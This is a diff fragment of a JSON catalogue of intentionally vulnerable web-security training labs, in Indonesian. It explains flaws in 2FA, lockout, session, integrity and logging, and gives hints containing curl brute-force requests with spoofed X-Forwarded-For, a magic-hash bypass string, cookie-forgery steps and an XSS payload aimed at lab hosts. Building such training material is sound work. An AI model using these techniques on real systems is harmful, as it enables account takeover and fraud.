+        "Server menyimpan flag \"password benar\" dan \"OTP terverifikasi\" terpisah, tapi dashboard cuma mengecek flag pertama - mengetik langsung URL step berikutnya melewati verifikasi OTP sama sekali."
+      ],
+      "id": "a06-insecure-design--flawed-auth-workflow--2fa-forced-browsing",
+      "category": "a06-insecure-design",
+      "topic": "flawed-auth-workflow",
+      "source_lab_status": 200,
+      "source_order": 97,
+      "source_hints": [
+        "Lihat Hint Goal: masuk ke halaman ?step=dashboard TANPA pernah memasukkan kode\nOTP yang benar. Login dulu dengan alice / Password123 (password sengaja\ndiberitahu di sini supaya fokus lab ke logika 2FA-nya, bukan menebak password) — server akan\nmengarahkanmu ke step OTP. Alih-alih mengisi OTP, coba akses langsung ?step=dashboard lewat address bar."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "form",
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Ganti password tanpa re-autentikasi",
+      "paragraphs": [
+        "Aksi sensitif ini tidak menuntut step-up authentication apa pun - sesi yang dicuri/dipinjam sebentar cukup untuk mengunci pemilik akun asli secara permanen."
+      ],
+      "id": "a06-insecure-design--flawed-auth-workflow--password-change-no-reauth",
+      "category": "a06-insecure-design",
+      "topic": "flawed-auth-workflow",
+      "source_lab_status": 200,
+      "source_order": 98,
+      "source_hints": [
+        "Lihat Hint Goal: perhatikan form di bawah — tidak ada field \"password lama\" sama sekali.\nGanti password akun cuma dengan mengisi password baru, lalu lihat log perubahan password di\nbawah untuk membuktikan tidak pernah ada verifikasi password lama yang terjadi."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "new_password"
+      ]
+    },
+    {
+      "title": "Trusted device bypass 2FA",
+      "paragraphs": [
+        "Token \"trusted device\" seharusnya acak & diikat ke device tertentu setelah OTP diverifikasi - di sini cuma username polos, gampang ditebak/disalin ke device manapun untuk melewati OTP sepenuhnya."
+      ],
+      "id": "a06-insecure-design--flawed-auth-workflow--trusted-device-bypass",
+      "category": "a06-insecure-design",
+      "topic": "flawed-auth-workflow",
+      "source_lab_status": 200,
+      "source_order": 99,
+      "source_hints": [
+        "Lihat Hint Goal: masuk ke ?step=dashboard tanpa pernah mengisi OTP yang benar\n— kali ini dashboard-nya SUDAH mengecek kedua flag session dengan benar (beda dari Lab 6), jadi\nforced browsing biasa tidak akan berhasil di sini. Perhatikan fitur \"Percayai perangkat ini 30\nhari\" di step OTP: coba tebak, tanpa pernah menyelesaikan OTP sekalipun, cookie macam apa yang\nkira-kira dipasang fitur itu — lalu set sendiri cookie trusted_device itu lewat\nDevTools SEBELUM login sama sekali, dan login ulang."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "form",
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "HTTP Parameter Pollution pada kupon",
+      "paragraphs": [
+        "Field kupon yang sah mendukung banyak kode berbeda sekaligus (array) tidak pernah men-deduplikasi kode yang SAMA muncul lebih dari sekali - diskon diterapkan berkali-kali dalam satu request."
+      ],
+      "id": "a06-insecure-design--business-rule-enforcement-gaps--coupon-parameter-pollution",
+      "category": "a06-insecure-design",
+      "topic": "business-rule-enforcement-gaps",
+      "source_lab_status": 200,
+      "source_order": 100,
+      "source_hints": [
+        "Lihat Hint Goal: checkout ini sengaja mendukung lebih dari satu kode kupon dalam satu\nrequest (dua kotak input, keduanya bernama coupon[] — fitur sah untuk mis. gift card\n+ kode promo sekaligus). Coba isi kotak PERTAMA dan kotak KEDUA dengan kode yang\nsama persis ( HEMAT10 ), lalu submit satu kali saja."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "coupon[]"
+      ]
+    },
+    {
+      "title": "Price spoofing lewat header region",
+      "paragraphs": [
+        "Region untuk penentuan harga diambil dari header yang sepenuhnya dikendalikan client, bukan dari sumber tepercaya seperti IP atau alamat billing terverifikasi."
+      ],
+      "id": "a06-insecure-design--business-rule-enforcement-gaps--region-price-spoofing",
+      "category": "a06-insecure-design",
+      "topic": "business-rule-enforcement-gaps",
+      "source_lab_status": 200,
+      "source_order": 101,
+      "source_hints": [
+        "Lihat Hint Goal: harga produk digital ini seharusnya Rp 1.500.000untuk region Indonesia (ID), tapi jauh lebih murah untuk region US\n(Rp 99 — asumsikan ini nilai dalam mata uang\nlokal yang jauh lebih rendah, murni untuk demo). Harga ditentukan dari header X-Region yang kamu kirim sendiri. Coba: curl -X POST -H \"X-Region: US\" http://localhost:8079/insecuredesign/lab10_region_price_spoofing.php Atau lewat browser, tambahkan ?region=US di URL (disediakan sebagai\nfallback kalau kamu tidak punya alat untuk mengubah header request)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Over-refund lewat kuantitas return",
+      "paragraphs": [
+        "Refund dihitung murni dari angka yang diminta client, tanpa validasi terhadap riwayat pembelian asli - bisa jauh melampaui total yang pernah dibeli."
+      ],
+      "id": "a06-insecure-design--business-rule-enforcement-gaps--over-refund",
+      "category": "a06-insecure-design",
+      "topic": "business-rule-enforcement-gaps",
+      "source_lab_status": 200,
+      "source_order": 102,
+      "source_hints": [
+        "Lihat Hint Goal: order #9001 cuma berisi 1x Sepatu Sneakers (lihat tabel di bawah). Ajukan return dengan kuantitas jauh lebih besar dari itu (mis. 50), lalu\nlihat berapa yang benar-benar dikreditkan ke wallet."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "return_qty"
+      ]
+    },
+    {
+      "title": "Pesan error berbeda",
+      "paragraphs": [
+        "Dua pesan error yang jelas berbeda membocorkan langsung validasi mana yang gagal."
+      ],
+      "id": "a07-authentication-failures--username-enumeration--different-message",
+      "category": "a07-authentication-failures",
+      "topic": "username-enumeration",
+      "source_lab_status": 200,
+      "source_order": 103,
+      "source_hints": [
+        "Lihat Hint Goal: coba login dengan username acak (mis. randomuser123 ) dan\nbandingkan pesannya dengan username alice yang memang terdaftar (password apa\nsaja). Dua pesan yang berbeda ini cukup untuk memetakan username mana saja yang valid, tanpa\nperlu tahu passwordnya sama sekali."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Response nyaris identik",
+      "paragraphs": [
+        "Perbedaan sekecil apa pun (titik di akhir kalimat) tetap membedakan Content-Length response."
+      ],
+      "id": "a07-authentication-failures--username-enumeration--subtle-difference",
+      "category": "a07-authentication-failures",
+      "topic": "username-enumeration",
+      "source_lab_status": 200,
+      "source_order": 104,
+      "source_hints": [
+        "Lihat Hint Goal: pesan error di sini terlihat SAMA PERSIS di layar untuk username salah vs\npassword salah. Tapi keduanya adalah string yang berbeda satu karakter (titik di akhir kalimat).\nBandingkan lewat \"View Page Source\" (Ctrl+U) untuk dua percobaan berbeda, atau lebih presisi\nlewat curl -s ... | xxd | tail / Burp Comparer untuk melihat perbedaan byte demi\nbyte. Coba: randomuser123 / password apa saja → perhatikan akhir kalimat error. Coba: alice / password salah → bandingkan dengan yang di atas."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Perbedaan waktu respons",
+      "paragraphs": [
+        "Pekerjaan tambahan (simulasi cost hashing password) hanya terjadi kalau username ditemukan - celah waktu ini jadi oracle validitas."
+      ],
+      "id": "a07-authentication-failures--username-enumeration--response-timing",
+      "category": "a07-authentication-failures",
+      "topic": "username-enumeration",
+      "source_lab_status": 200,
+      "source_order": 105,
+      "source_hints": [
+        "Lihat Hint Goal: pesan error di sini SELALU identik ( Invalid username or\npassword. ) terlepas dari mana yang salah — tidak ada perbedaan pesan sama sekali.\nTapi waktu respons berbeda: username valid memicu proses verifikasi password yang mensimulasikan\ncost hashing asli (di sini: usleep(300000) , 0.3 detik), sementara username tidak\nvalid langsung dijawab tanpa delay itu. Waktu respons diukur & ditampilkan di bawah untuk\nlab ini (di dunia nyata, kamu akan mengukurnya sendiri lewat Burp Intruder + Response Timer,\natau time curl ... , idealnya diulang beberapa kali untuk meredam noise jaringan)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Account lockout membocorkan validitas",
+      "paragraphs": [
+        "Mekanisme keamanan (lockout) itu sendiri jadi oracle baru karena hanya \"aktif\" untuk username yang benar-benar ada."
+      ],
+      "id": "a07-authentication-failures--username-enumeration--account-lockout",
+      "category": "a07-authentication-failures",
+      "topic": "username-enumeration",
+      "source_lab_status": 200,
+      "source_order": 106,
+      "source_hints": [
+        "Lihat Hint Goal: coba salah password 3x berturut-turut untuk username alice (valid) — muncul pesan \"akun dikunci\". Coba juga 3x untuk username acak yang tidak\nterdaftar (mis. randomuser123 ) — pesan lockout TIDAK PERNAH muncul untuk\nusername manapun yang tidak valid, karena counter percobaan hanya dibuat untuk username yang\nmemang ada. Perbedaan perilaku inilah oracle-nya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Tidak ada rate limiting",
+      "paragraphs": [
+        "Setiap kandidat password dicoba tanpa hambatan apa pun - wordlist besar bisa dihabiskan dalam hitungan detik."
+      ],
+      "id": "a07-authentication-failures--brute-force-protection--no-rate-limit",
+      "category": "a07-authentication-failures",
+      "topic": "brute-force-protection",
+      "source_lab_status": 200,
+      "source_order": 107,
+      "source_hints": [
+        "Lihat Hint Goal: form login di bawah tidak menerapkan rate limiting, lockout, maupun\nCAPTCHA apa pun. Tool \"brute force\" di bawah mensimulasikan serangan otomatis: masukkan\nwordlist (satu password per baris), server akan mencoba semuanya secara berurutan tanpa\nhambatan apa pun. Di dunia nyata, ini dilakukan lewat Burp Intruder (sniper attack) atau script\nsederhana yang mengirim request login berulang dengan password berbeda dari wordlist\n(rockyou.txt, dsb)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "manual",
+        "username",
+        "password",
+        "wordlist"
+      ]
+    },
+    {
+      "title": "Lockout berbasis IP, bypass X-Forwarded-For",
+      "paragraphs": [
+        "Header ini sepenuhnya dikendalikan pengirim request - mengubahnya di tiap percobaan memberi \"IP baru\" setiap kali."
+      ],
+      "id": "a07-authentication-failures--brute-force-protection--xff-bypass",
+      "category": "a07-authentication-failures",
+      "topic": "brute-force-protection",
+      "source_lab_status": 200,
+      "source_order": 108,
+      "source_hints": [
+        "Lihat Hint Goal: setelah 3x gagal dari \"IP\" yang sama, IP itu diblokir. Server menentukan\nIP dari header X-Forwarded-For kalau ada (mensimulasikan aplikasi di belakang\nreverse proxy yang salah konfigurasi, mempercayai header ini apa adanya alih-alih memasangnya\nsendiri berdasarkan koneksi TCP asli). Karena header ini sepenuhnya dikendalikan\npengirim request , kirim tiap percobaan password dengan nilai X-Forwarded-For yang berbeda-beda supaya tidak pernah kena limit 3x untuk \"IP\" yang sama: curl -X POST -H \"X-Forwarded-For: 1.1.1.1\" -d \"username=admin&password=123456\" http://target/lab2_xff_bypass.php\ncurl -X POST -H \"X-Forwarded-For: 2.2.2.2\" -d \"username=admin&password=password\" http://target/lab2_xff_bypass.php\ncurl -X POST -H \"X-Forwarded-For: 3.3.3.3\" -d \"username=admin&password=Passw0rd!\" http://target/lab2_xff_bypass.php\n# ...ulangi dengan IP palsu baru untuk tiap kandidat password"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Lockout bypass via variasi kapitalisasi",
+      "paragraphs": [
+        "\"admin\", \"Admin\", \"ADMIN\" masing-masing dapat jatah percobaan baru, padahal menyerang akun yang sama."
+      ],
+      "id": "a07-authentication-failures--brute-force-protection--case-variation-bypass",
+      "category": "a07-authentication-failures",
+      "topic": "brute-force-protection",
+      "source_lab_status": 200,
+      "source_order": 109,
+      "source_hints": [
+        "Lihat Hint Goal: login sendiri case-insensitive ( admin = Admin = ADMIN , akun yang sama). Tapi counter percobaan gagal disimpan berdasarkan string persis yang dikirim client, bukan bentuk yang sudah dinormalisasi\n( strtolower() ). Ganti kapitalisasi username di tiap beberapa percobaan untuk\nmendapat \"jatah\" 3x percobaan baru terus-menerus, padahal seluruhnya menyerang akun yang sama: admin, Admin, ADMIN, aDmin, AdMiN, adMIN, ... Coba beberapa kandidat password dengan variasi kapitalisasi berbeda di form\ndi bawah untuk melihat counter-nya selalu \"reset\" ke 0/3."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Session ID sekuensial",
+      "paragraphs": [
+        "Sekali satu token diketahui, token di sekitarnya bisa ditebak lewat iterasi sederhana."
+      ],
+      "id": "a07-authentication-failures--session-management--predictable-session-id",
+      "category": "a07-authentication-failures",
+      "topic": "session-management",
+      "source_lab_status": 200,
+      "source_order": 111,
+      "source_hints": [
+        "Lihat Hint Goal: setiap token baru cuma \"SESS-\" + angka urut berikutnya. Klik \"Simulasikan\nalice login\" (mensimulasikan korban login di perangkat lain - kamu TIDAK melihat token-nya\nlangsung), lalu klik \"Login sebagai attacker\" untuk melihat token milikmu sendiri. Karena\ntoken cuma angka urut, token alice pasti persis satu angka sebelum token attacker (kalau alice\nlogin tepat sebelum kamu). Coba tebak lewat form \"Cek akses dengan token\" di bawah."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "check_token"
+      ]
+    },
+    {
+      "title": "Session Fixation",
+      "paragraphs": [
+        "Attacker memilih token sendiri sebelum korban login - token itu \"naik level\" jadi sesi terotentikasi tanpa pernah diganti."
+      ],
+      "id": "a07-authentication-failures--session-management--session-fixation",
+      "category": "a07-authentication-failures",
+      "topic": "session-management",
+      "source_lab_status": 200,
+      "source_order": 112,
+      "source_hints": [
+        "Lihat Hint Goal: sebagai attacker, kamu memilih sendiri nilai token, mis. FIXED-abc123 , lalu \"mengirim link\" itu ke korban: lab3_session_fixation.php?fixed_token=FIXED-abc123 Buka link itu (mensimulasikan korban mengklik link dari attacker) — token\nlangsung ter-set di cookie SEBELUM korban login sama sekali. Lalu login di form di bawah sebagai alice/alice123 (mensimulasikan korban login). Karena server tidak pernah\nmengganti token setelah login berhasil, token FIXED-abc123 yang SUDAH kamu ketahui\ndari awal kini terikat ke akun alice. Buka form \"Cek akses dengan token\" dengan FIXED-abc123 untuk membuktikan kamu bisa masuk sebagai alice."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password",
+        "check_token"
+      ]
+    },
+    {
+      "title": "Session token di URL",
+      "paragraphs": [
+        "URL (termasuk query string) dicatat access log server, riwayat browser, dan bisa bocor lewat Referer."
+      ],
+      "id": "a07-authentication-failures--session-management--token-in-url",
+      "category": "a07-authentication-failures",
+      "topic": "session-management",
+      "source_lab_status": 200,
+      "source_order": 113,
+      "source_hints": [
+        "Lihat Hint Goal: klik \"Login\" di bawah — kamu akan diarahkan ke URL yang membawa\ntoken otentikasi lengkap di query string ( ?authtoken=... ), bukan lewat cookie.\nSetiap web server (Apache/nginx) mencatat URL lengkap yang diakses (termasuk query string) ke\naccess log-nya secara default. Log itu sering bisa dibaca oleh pihak yang seharusnya tidak\nberhak melihat sesi pengguna: tim support, log aggregator pihak ketiga (Datadog/Splunk), atau\nsiapa pun yang mendapat akses log lewat cara lain. Scroll ke bawah untuk melihat simulasi log\nitu — salin token dari salah satu baris (bisa punyamu sendiri untuk demo, di dunia nyata\nini akan jadi token pengguna lain), lalu buka ?authtoken=<token> di jendela\nbrowser lain (mode incognito) untuk membuktikan sesi bisa dibajak hanya dari log."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "PHP Object Injection via cookie",
+      "paragraphs": [
+        "unserialize() dipanggil langsung ke data cookie tanpa validasi - properti objek (termasuk role) bisa diubah bebas lewat payload serialize() buatan sendiri."
+      ],
+      "id": "a08-software-data-integrity-failures--integrity--php-object-injection",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "integrity",
+      "source_lab_status": 200,
+      "source_order": 118,
+      "source_hints": [
+        "Lihat Hint Goal: buka Admin Panel di bawah tanpa login sebagai admin.\nCookie remember_token menyimpan objek PHP yang sudah di- serialize() ,\ndan server mendeserialisasinya kembali dengan unserialize() lalu langsung\nmempercayai properti role -nya. Kamu tidak perlu tahu password siapa pun —\ncukup ganti isi cookie dengan versi yang propertinya sudah kamu ubah sendiri. Klik tombol \"Generate Payload Admin\" di bawah untuk melihat\nstring serialize() yang sudah berisi role=admin . Salin string itu,\nlalu di DevTools → Application → Cookies (atau lewat Burp), ganti nilai cookie remember_token dengan string tersebut persis, dan reload halaman ini."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "State cookie tanpa signature",
+      "paragraphs": [
+        "Server mempercayai penuh isi cookie setelah di-decode - tidak ada HMAC/signature apa pun yang mencegah field di dalamnya diubah bebas."
+      ],
+      "id": "a08-software-data-integrity-failures--integrity--unsigned-state-cookie",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "integrity",
+      "source_lab_status": 200,
+      "source_order": 119,
+      "source_hints": [
+        "Lihat Hint Goal: checkout berhasil padahal saldo aslimu Rp 0, dan/atau ubah role jadi admin . Seluruh state (saldo, total belanja, role) disimpan di cookie cart_state sebagai base64_encode(json_encode(...)) — server tidak\nmenyimpan salinan \"asli\" di server, dan tidak ada tanda tangan apa pun yang mencegah kamu\nmengubah isinya sebelum dikirim balik. Langkah: (1) buka DevTools → Application → Cookies, salin nilai cookie cart_state . (2) Decode base64-nya (console: atob(\"...\") ) untuk melihat\nJSON aslinya. (3) Edit field wallet_balance (atau cart_total , role ) jadi nilai apa pun yang kamu mau. (4) Encode ulang ke base64\n( btoa(JSON.stringify(obj)) ). (5) Set kembali sebagai nilai cookie cart_state , reload halaman ini."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Signature check pakai == (timing attack)",
+      "paragraphs": [
+        "Signature memang di-generate dengan HMAC yang benar, tapi verifikasinya memakai perbandingan string == alih-alih hash_equals() yang constant-time - membuka celah timing attack."
+      ],
+      "id": "a08-software-data-integrity-failures--integrity--timing-unsafe-hmac",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "integrity",
+      "source_lab_status": 200,
+      "source_order": 120,
+      "source_hints": [
+        "Lihat Hint Goal: dapatkan voucher dengan signature yang valid TANPA pernah tahu SECRET_KEY di server. Ada dua jalur: Jalur 1 (timing attack, konsep utama lab ini): endpoint verifikasi\nmembandingkan signature memakai == , bukan hash_equals() . Ini tidak\nkonstan waktu — tebakan yang cocok di lebih banyak byte awal butuh waktu (sedikit) lebih\nlama untuk ditolak. Coba tebak signature satu karakter hex demi satu karakter lewat endpoint ?data=...&sig_guess=... sambil mengukur waktu respons (lihat README untuk contoh\nscript). Endpoint ini balas MATCH / NO_MATCH dalam teks polos supaya cepat\ndiukur. Jalur 2 (fallback lebih sederhana): SECRET_KEY sengaja dibuat pendek/lemah. Kalau kamu tahu satu pasang data dan signature yang valid (misalnya dari cookie voucher kamu sendiri di bawah), kamu bisa\nbrute force SECRET_KEY -nya secara offline: coba banyak kandidat key, hitung hash_hmac('sha256', $data, $candidate_key) , dan bandingkan ke signature yang kamu\npunya. Begitu key ditemukan, kamu bisa memalsukan voucher APA PUN (misalnya discount=100 ) dengan signature yang sah."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "verify_data",
+        "verify_sig"
+      ]
+    },
+    {
+      "title": "Update artifact tanpa checksum",
+      "paragraphs": [
+        "Fitur \"apply update\" admin menerima file apa saja dan langsung menerapkannya - tidak ada perbandingan checksum/signature terhadap artifact resmi."
+      ],
+      "id": "a08-software-data-integrity-failures--integrity--update-no-checksum",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "integrity",
+      "source_lab_status": 200,
+      "source_order": 121,
+      "source_hints": [
+        "Lihat Hint Goal: upload file \"update\" apa pun (bukan file resmi) dan lihat bahwa server\nmenerimanya begitu saja sebagai update sistem yang sah, tanpa mengeceknya terhadap checksum resmi\nsama sekali. Buat file teks apa pun berisi teks bebas (misalnya berisi konfigurasi/perintah\npalsu), upload lewat form di bawah, dan perhatikan bahwa halaman tidak pernah membandingkan hash\nfile kamu dengan data/official_update_checksum.txt — field itu memang ada di\nserver, tapi kodenya tidak pernah membacanya."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "update_file"
+      ]
+    },
+    {
+      "title": "Magic Hash / Type Juggling Bypass",
+      "paragraphs": [
+        "Dua hash MD5 yang isinya sama sekali berbeda tapi sama-sama berbentuk \"0e\" diikuti hanya digit dianggap \"sama\" oleh operator ==, karena keduanya dikonversi jadi angka 0 dulu sebelum dibandingkan."
+      ],
+      "id": "a08-software-data-integrity-failures--broken-integrity-verification--magic-hash-bypass",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "broken-integrity-verification",
+      "source_lab_status": 200,
+      "source_order": 122,
+      "source_hints": [
+        "Lihat Hint Goal: lewati verifikasi kode recovery akun TANPA pernah tahu kode aslinya. Server\nmembandingkan md5($kode_yang_kamu_kirim) == $hash_yang_tersimpan — perhatikan ini == , bukan === . Kirim string QNKCDZO sebagai kode recovery."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "recovery_code"
+      ]
+    },
+    {
+      "title": "Signing Secret Bocor di Client-Side JS",
+      "paragraphs": [
+        "Mekanisme HMAC-nya sendiri benar, tapi secret yang dipakai menandatangani bukan rahasia sama sekali - ada di file JS yang dimuat publik untuk fitur \"live preview\"."
+      ],
+      "id": "a08-software-data-integrity-failures--broken-integrity-verification--leaked-signing-secret",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "broken-integrity-verification",
+      "source_lab_status": 200,
+      "source_order": 123,
+      "source_hints": [
+        "Lihat Hint Goal: buat link reset password yang VALID untuk email admin@corp.test TANPA pernah memintanya lewat form \"Lupa Password\" yang sah (yang\nseharusnya mengirim link itu lewat inbox email admin, bukan ke kamu). Halaman ini memuat reset_preview.js untuk fitur \"live\npreview\" — buka file itu langsung dan baca isinya.",
+        "Cara menghitung token sendiri (kalau butuh) php -r \"echo hash_hmac('sha256', 'admin@corp.test', 'corp-reset-2024-preview-key');\""
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "email",
+        "token"
+      ]
+    },
+    {
+      "title": "Signature Cuma Menutupi Sebagian Data",
+      "paragraphs": [
+        "Field yang tidak ikut ditandatangani bisa diubah bebas tanpa membuat signature-nya tidak valid - canonicalization yang tidak lengkap membuat proteksi integritasnya cuma parsial."
+      ],
+      "id": "a08-software-data-integrity-failures--broken-integrity-verification--partial-signature-gap",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "broken-integrity-verification",
+      "source_lab_status": 200,
+      "source_order": 124,
+      "source_hints": [
+        "Lihat Hint Goal: eksekusi transfer ke rekening BERBEDA dari rekening yang aslinya disetujui\n( 1111111111 ), TANPA membuat signature-nya menjadi tidak\nvalid. Form di bawah sudah pre-filled dengan instruksi transfer yang sah lengkap dengan\nsignature-nya. Ubah field recipient (dan/atau currency ) sebelum submit\n— JANGAN ubah amount maupun signature ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "amount",
+        "currency",
+        "recipient",
+        "signature"
+      ]
+    },
+    {
+      "title": "Checksum dari Sumber yang Sama dengan Artifact",
+      "paragraphs": [
+        "Perbandingan checksum-nya benar secara matematis, tapi tidak membuktikan apa pun karena checksum pembanding bukan dari kanal independen yang tepercaya."
+      ],
+      "id": "a08-software-data-integrity-failures--broken-integrity-verification--checksum-same-source",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "broken-integrity-verification",
+      "source_lab_status": 200,
+      "source_order": 125,
+      "source_hints": [
+        "Lihat Hint Goal: \"terapkan\" package yang isinya jelas-jelas berbahaya, dengan checksum yang\ntetap dinyatakan VALID oleh server. Isi textarea dengan konten apa pun (bebas, simulasikan\npayload jahat), lalu hitung checksum SHA-256-nya sendiri dan tempel ke field checksum. echo -n \"isi package kamu\" | sha256sum"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "package_content",
+        "checksum"
+      ]
+    },
+    {
+      "title": "Variable Injection Lewat extract()",
+      "paragraphs": [
+        "Variabel seperti $is_admin yang diinisialisasi aman di awal skrip langsung tertimpa oleh parameter URL dengan nama yang sama - mengulang masalah register_globals secara manual."
+      ],
+      "id": "a08-software-data-integrity-failures--untrusted-input-shaping-state--extract-variable-injection",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "untrusted-input-shaping-state",
+      "source_lab_status": 200,
+      "source_order": 126,
+      "source_hints": [
+        "Lihat Hint Goal: buat halaman ini menampilkan status \"ADMIN\" dan saldo akun yang kamu\ntentukan sendiri, padahal kedua variabel itu diinisialisasi aman\n( $is_admin = false; $account_balance = 0; ) sebelum kode di bawahnya berjalan. Coba\ntambahkan parameter URL yang namanya PERSIS SAMA dengan nama variabel PHP yang ingin kamu timpa. ?is_admin=1&account_balance=999999999&username=SUPERUSER"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Dynamic Dispatch dari Input Tak Tepercaya",
+      "paragraphs": [
+        "function_exists($action) dipakai untuk memutuskan boleh-tidaknya suatu action dijalankan - fungsi internal yang tidak pernah ditautkan ke UI manapun tetap reachable selama namanya bisa ditebak."
+      ],
+      "id": "a08-software-data-integrity-failures--untrusted-input-shaping-state--untrusted-dynamic-dispatch",
+      "category": "a08-software-data-integrity-failures",
+      "topic": "untrusted-input-shaping-state",
+      "source_lab_status": 200,
+      "source_order": 127,
+      "source_hints": [
+        "Lihat Hint Goal: panggil sebuah fungsi internal yang TIDAK PERNAH ditautkan di menu manapun\ndi aplikasi ini. Menu resmi cuma view_profile dan view_orders — coba\ntebak nama fungsi lain yang masuk akal ada di kodebase sistem role-management semacam ini (mis.\npola grant_admin_role , umum dipakai internal tooling)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Log injection (log forgery)",
+      "paragraphs": [
+        "Username yang dicatat ke log tidak difilter dari karakter newline - baris log palsu bisa disisipkan untuk menyesatkan investigasi insiden."
+      ],
+      "id": "a09-logging-alerting-failures--logging--log-injection-forgery",
+      "category": "a09-logging-alerting-failures",
+      "topic": "logging",
+      "source_lab_status": 200,
+      "source_order": 128,
+      "source_hints": [
+        "Lihat Hint Goal: form login di bawah menulis setiap percobaan ke data/auth.log memakai username mentah dari input kamu, tanpa membuang karakter newline\n( \\n ). Karena field username di sini berupa <textarea> , kamu bisa\nbenar-benar mengetik/menempel baris baru di dalamnya. Coba isi username dengan sesuatu seperti: bob\n[2026-01-01 03:00:00] LOGIN ATTEMPT: user=admin, result=SUCCESS Password bebas isi apa saja (login akan gagal, tidak masalah — yang penting\nlihat apa yang tertulis di auth.log di bawah setelah submit)."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "password"
+      ]
+    },
+    {
+      "title": "Log injection -> Stored XSS di dashboard admin",
+      "paragraphs": [
+        "Log dianggap \"data internal tepercaya\" sehingga dirender tanpa htmlspecialchars() - padahal isinya tetap berasal dari input user yang tidak tepercaya."
+      ],
+      "id": "a09-logging-alerting-failures--logging--log-injection-stored-xss",
+      "category": "a09-logging-alerting-failures",
+      "topic": "logging",
+      "source_lab_status": 200,
+      "source_order": 129,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"Cari Produk\" di bawah mencatat setiap query pencarian ke data/search.log memakai nilai mentah dari $_GET['q'] , tanpa encoding\napa pun. Lebih jauh lagi, ada \"Admin: Log Dashboard\" yang membaca ulang file log itu dan me-render\nbagian query-nya langsung ke HTML lewat echo $query; — tanpa htmlspecialchars() — karena tim internal menganggap \"ini kan cuma log\nkita sendiri, aman\". Bedanya dengan lab XSS biasa: di sini pintu masuknya bukan kotak komentar publik,\ntapi pipeline logging — log tetap berisi input pengguna yang tidak\ntepercaya, dan harus di-encode saat dirender, sama seperti data user lainnya. Coba cari: <img src=x onerror=\"document.title='PWNED-VIA-LOG'\"> lalu buka \"Admin: Log Dashboard\" di bawah dan lihat judul tab berubah — scriptnya benar-benar\njalan di konteks halaman admin."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
